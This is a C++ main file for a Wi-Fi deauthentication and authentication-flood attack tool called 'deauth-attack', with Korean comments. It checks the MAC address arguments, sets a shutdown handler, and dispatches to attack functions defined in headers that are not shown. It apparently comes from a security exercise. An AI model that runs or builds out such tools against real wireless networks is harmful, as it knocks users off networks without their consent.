// main.cpp
#include <iostream>
#include <pcap.h>
#include <cstdlib>
#include <signal.h>
#include <regex>
#include "deauth.h"
#include "auth.h"

// 전역 변수
volatile sig_atomic_t keep_running = 1;

// 시그널 핸들러
void signal_handler(int signum) {
    if (signum == SIGINT) {
        keep_running = 0;
        std::cout << "\nShutting down..." << std::endl;
    }
}

// MAC 주소 형식 검증 함수
bool isValidMacAddress(const std::string& mac) {
    const std::regex pattern("([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2})");
    return std::regex_match(mac, pattern);
}

// 사용법 출력
void printUsage() {
    std::cerr << "syntax: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n";
    std::cerr << "sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}

// 메인 함수
int main(int argc, char* argv[]) {
    if (argc < 3 || argc > 5) {
        printUsage();
        return -1;
    }

    // 시그널 핸들러 설정
    signal(SIGINT, signal_handler);

    std::string dev = argv[1];
    std::string apMac = argv[2];
    std::string stationMac = "";
    bool authAttack = false;
    bool broadcastMode = true;

    // MAC 주소 검증
    if (!isValidMacAddress(apMac)) {
        std::cerr << "Invalid AP MAC address format.\n";
        return -1;
    }

    // station MAC이 제공된 경우
    if (argc >= 4) {
        stationMac = argv[3];
        if (!isValidMacAddress(stationMac)) {
            std::cerr << "Invalid station MAC address format.\n";
            return -1;
        }
        broadcastMode = false;
    }

    // auth 옵션 확인
    if (argc == 5 && std::string(argv[4]) == "-auth") {
        if (broadcastMode) {
            std::cerr << "Authentication attack requires a station MAC address.\n";
            return -1;
        }
        authAttack = true;
    }

    // 공격 실행
    if (authAttack) {
        runAuthAttack(dev, apMac, stationMac, &keep_running);
    } else {
        runDeauthAttack(dev, apMac, stationMac, broadcastMode, &keep_running);
    }

    return 0;
}

